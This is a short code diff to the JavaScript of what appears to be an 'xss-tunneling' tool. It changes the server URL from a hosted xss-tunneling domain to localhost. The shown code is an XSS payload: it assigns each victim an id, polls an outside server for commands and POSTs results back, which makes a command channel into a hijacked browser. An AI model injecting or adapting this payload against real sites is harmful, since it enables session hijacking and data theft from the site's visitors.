@@ -2,6 +2,8 @@
     var currentId = createUUID();
     var keys;
 
+    var devUrl = "http://localhost:8080/";
+
     var script = document.createElement("SCRIPT");
     script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
     script.type = 'text/javascript';
@@ -23,7 +25,7 @@
                 function () {
                     $.ajax({
                                type: 'GET',
-                               url: 'http://xss-tunneling.byronvoorbach.cloudbees.net/ping/' + currentId,
+                               url: devUrl + 'ping/' + currentId,
                                contentType: 'text/plain',
                                xhrFields: {
                                    withCredentials: false
@@ -73,7 +75,7 @@
     function sendCommandToServer(type, data) {
         $.ajax({
                    type: "POST",
-                   url: "http://xss-tunneling.byronvoorbach.cloudbees.net/" + type + '/' + currentId,
+                   url: devUrl + type + '/' + currentId,
                    data: data,
                    contentType: "application/json; charset=utf-8"
                });
